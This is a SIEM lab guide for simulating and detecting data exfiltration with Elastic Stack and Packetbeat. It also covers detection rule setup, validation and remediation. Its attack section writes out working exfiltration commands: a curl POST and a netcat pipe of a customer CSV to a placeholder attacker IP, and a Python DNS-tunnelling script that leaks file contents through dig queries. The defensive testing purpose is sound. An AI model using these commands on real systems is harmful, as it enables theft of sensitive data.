# Data Exfiltration Detection Scenario

## 1. Attack Overview and Real-world Context

Data exfiltration is the unauthorized transfer of sensitive data from an organization to an external destination. This type of attack typically occurs after an attacker has already gained access to a network and identified valuable data. Data exfiltration can lead to intellectual property theft, exposure of customer information, financial loss, and regulatory compliance violations.

### Real-world Context

Data exfiltration attacks have been responsible for some of the most significant data breaches:
- The 2020 SolarWinds attack involved exfiltration of sensitive data from multiple government agencies and private companies
- The 2017 Equifax breach resulted in the exfiltration of personal information for 147 million people
- The Target breach in 2013 involved exfiltration of 40 million credit card numbers
- Healthcare data breaches frequently involve exfiltration of protected health information (PHI)

Attackers use various techniques to exfiltrate data, including:
- Direct file transfers over HTTP/HTTPS
- DNS tunneling
- Steganography
- Email attachments
- Cloud storage uploads
- Custom protocols over allowed ports

## 2. Environment Setup Requirements

### Prerequisites

- Functioning Elastic Stack SIEM deployment as described in the [Deployment Guide](../docker/DEPLOYMENT.md)
- Configured data pipelines for network traffic monitoring
- Configured detection rules for unusual data transfers
- A test system with Packetbeat installed (can be a Docker container or VM)
- Sample sensitive data files (non-production test data only)

### Test Environment Setup

1. Create a test environment using Docker:

```bash
# Create a test container
docker run -d --name exfil-test ubuntu:latest sleep infinity
```

2. Install necessary tools in the test environment:

```bash
docker exec -it exfil-test apt-get update
docker exec -it exfil-test apt-get install -y curl wget netcat python3 python3-pip
docker exec -it exfil-test pip3 install requests
```

3. Create sample sensitive data files:

```bash
docker exec -it exfil-test bash -c "cat > /tmp/customer_data.csv << 'EOF'
id,name,email,credit_card,ssn
1,John Doe,john.doe@example.com,4111111111111111,123-45-6789
2,Jane Smith,jane.smith@example.com,5555555555554444,987-65-4321
3,Bob Johnson,bob.johnson@example.com,378282246310005,456-78-9012
4,Alice Williams,alice.williams@example.com,6011111111111117,789-01-2345
5,Charlie Brown,charlie.brown@example.com,3530111333300000,234-56-7890
EOF"
```

4. Configure Packetbeat to monitor network traffic:

```bash
# Ensure Packetbeat is configured to monitor all relevant protocols
# Particularly HTTP, DNS, and raw network traffic
```

5. Configure the Data Exfiltration Detection rule in Kibana:
   - Navigate to **Security** > **Detections** > **Manage detection rules**
   - Create a rule with the following settings:
     - Name: `Data Exfiltration Detection`
     - Description: `Detects potential data exfiltration based on unusual outbound traffic patterns`
     - Index pattern: `packetbeat-*`
     - Query: `destination.ip:* AND NOT destination.ip:10.0.0.0/8 AND NOT destination.ip:172.16.0.0/12 AND NOT destination.ip:192.168.0.0/16`
     - Threshold: Sum of `network.bytes_out` > 1000000 grouped by `source.ip` in 5 minutes
     - Schedule: Run every 5 minutes

## 3. Attack Execution Steps

### Method 1: Direct File Transfer via HTTP

1. Create a simple HTTP server to receive the data (on a separate system):

```bash
# On a separate system (attacker machine)
python3 -m http.server 8000
```

2. Exfiltrate data using curl:

```bash
docker exec -it exfil-test bash -c "curl -X POST -d @/tmp/customer_data.csv http://<attacker_ip>:8000"
```

### Method 2: DNS Tunneling

1. Create a Python script to simulate DNS tunneling:

```bash
docker exec -it exfil-test bash -c "cat > /tmp/dns_exfil.py << 'EOF'
#!/usr/bin/env python3
import base64
import subprocess
import time
import random
import string

def chunk_data(data, chunk_size=30):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

def generate_random_subdomain(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def exfiltrate_via_dns(file_path, domain='example.com'):
    # Read the file
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Base64 encode the data
    encoded_data = base64.b64encode(data).decode('utf-8')
    
    # Split into chunks
    chunks = chunk_data(encoded_data)
    
    # Send each chunk via DNS query
    for i, chunk in enumerate(chunks):
        # Create a unique subdomain for each chunk
        subdomain = f"{generate_random_subdomain()}-{i}-{chunk}"
        
        # Perform DNS lookup
        dns_query = f"{subdomain}.{domain}"
        print(f"Exfiltrating chunk {i+1}/{len(chunks)}: {dns_query}")
        
        try:
            subprocess.run(['dig', dns_query], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Add a small delay between requests
            time.sleep(random.uniform(0.1, 0.5))
        except Exception as e:
            print(f"Error sending chunk {i+1}: {str(e)}")

if __name__ == "__main__":
    exfiltrate_via_dns('/tmp/customer_data.csv')
    print("Data exfiltration simulation completed.")
EOF"
```

2. Install the necessary tools and run the script:

```bash
docker exec -it exfil-test apt-get install -y dnsutils
docker exec -it exfil-test python3 /tmp/dns_exfil.py
```

### Method 3: Large Volume Data Transfer

1. Create a large file to simulate exfiltration of a significant amount of data:

```bash
docker exec -it exfil-test bash -c "dd if=/dev/urandom of=/tmp/large_file.bin bs=1M count=100"
```

2. Transfer the file using netcat:

```bash
# On a separate system (attacker machine)
nc -l -p 9999 > stolen_data.bin

# In the test container
docker exec -it exfil-test bash -c "cat /tmp/large_file.bin | nc <attacker_ip> 9999"
```

## 4. Expected Detection Outcomes

### Alerts

The Elastic Stack SIEM should generate alerts based on the configured detection rules when:
- Unusual volumes of outbound traffic are detected
- Data transfers to suspicious or uncommon destinations occur
- Abnormal protocols or ports are used for data transfer
- Patterns consistent with encoded or encrypted data transfers are observed

### Dashboard Visualization

The following visualizations should reflect the data exfiltration activity:
- **Network Traffic Over Time**: Should show spikes during the exfiltration
- **Top Destination IPs/Domains**: Should highlight the destinations receiving the exfiltrated data
- **Data Transfer Volume by Source**: Should identify the sources of large data transfers
- **Protocol Distribution**: May show unusual protocols being used

### Timeline

The SIEM timeline should show:
1. Initial connection establishment
2. Data transfer activities
3. Connection termination
4. Any related events such as file access before exfiltration

## 5. Validation Methods

### Verify Alert Generation

1. Navigate to **Security** > **Alerts** in Kibana
2. Confirm that a "Data Exfiltration Detection" alert was generated
3. Verify that the alert contains:
   - The correct source IP address
   - The destination receiving the data
   - The volume of data transferred
   - The correct timestamp range

### Verify Network Traffic Monitoring

1. Navigate to **Discover** in Kibana
2. Select the `packetbeat-*` index pattern
3. Search for `source.ip:<test_container_ip> AND destination.ip:<attacker_ip>`
4. Verify that the network traffic was properly captured and indexed

### Verify Data Transfer Volume Tracking

1. Navigate to **Security** > **Network** in Kibana
2. Review the "Network Traffic" visualization
3. Verify that the spike in outbound traffic is visible during the exfiltration period

## 6. Remediation Recommendations

Based on the detection of data exfiltration, the following remediation steps are recommended:

### Immediate Actions

1. **Block the suspicious connections**:
   ```bash
   sudo iptables -A OUTPUT -d <destination_ip> -j DROP
   ```

2. **Isolate the affected system**:
   ```bash
   # Disconnect from network or isolate via firewall
   sudo iptables -A INPUT -d <affected_host_ip> -j DROP
   sudo iptables -A OUTPUT -s <affected_host_ip> -j DROP
   ```

3. **Preserve evidence for investigation**:
   ```bash
   # Capture network traffic for forensic analysis
   sudo tcpdump -i any -w /tmp/evidence_$(date +%Y%m%d_%H%M%S).pcap host <affected_host_ip>
   ```

### Long-term Mitigations

1. **Implement Data Loss Prevention (DLP)**:
   - Deploy DLP solutions to monitor and control data transfers
   - Configure content inspection for sensitive data patterns
   - Example implementation using open-source tools:
     ```bash
     # Install and configure OpenDLP or similar tool
     ```

2. **Enhance network segmentation**:
   - Implement network segmentation to restrict access to sensitive data
   - Use VLANs, firewalls, and access control lists to enforce boundaries
   - Example segmentation rule:
     ```bash
     # Allow only specific systems to access database servers
     sudo iptables -A FORWARD -s 10.0.1.0/24 -d 10.0.2.0/24 -p tcp --dport 3306 -j ACCEPT
     sudo iptables -A FORWARD -s 10.0.0.0/8 -d 10.0.2.0/24 -p tcp --dport 3306 -j DROP
     ```

3. **Implement egress filtering**:
   - Control outbound traffic to prevent unauthorized data transfers
   - Block access to known file sharing and cloud storage services
   - Example egress filtering rule:
     ```bash
     # Block outbound connections to common file sharing services
     sudo iptables -A OUTPUT -d dropbox.com -j DROP
     sudo iptables -A OUTPUT -d drive.google.com -j DROP
     ```

4. **Encrypt sensitive data**:
   - Implement encryption for data at rest and in transit
   - Use tools like VeraCrypt, LUKS, or PGP for file encryption
   - Example encryption command:
     ```bash
     # Encrypt sensitive files
     gpg --encrypt --recipient user@example.com sensitive_file.txt
     ```

## 7. Additional Resources

- [MITRE ATT&CK Framework - Exfiltration](https://attack.mitre.org/tactics/TA0010/)
- [NIST Special Publication 800-53: Security Controls for Exfiltration Prevention](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
- [SANS Institute: Data Exfiltration White Paper](https://www.sans.org/reading-room/whitepapers/analyst/detecting-preventing-data-exfiltration-attacks-36947)
- [Elastic Security Labs - Data Exfiltration Detection](https://www.elastic.co/security-labs/detecting-data-exfiltration)

## 8. Conclusion

This scenario demonstrates how the Elastic Stack SIEM can detect data exfiltration attempts through network traffic monitoring, behavioral analysis, and anomaly detection. By implementing proper detection rules and monitoring visualizations, security teams can quickly identify and respond to data exfiltration attempts before significant data loss occurs.

The detection capabilities demonstrated in this scenario can be enhanced by integrating additional security controls such as Data Loss Prevention (DLP) solutions, endpoint monitoring, and user behavior analytics to provide a more comprehensive defense against data exfiltration attacks.

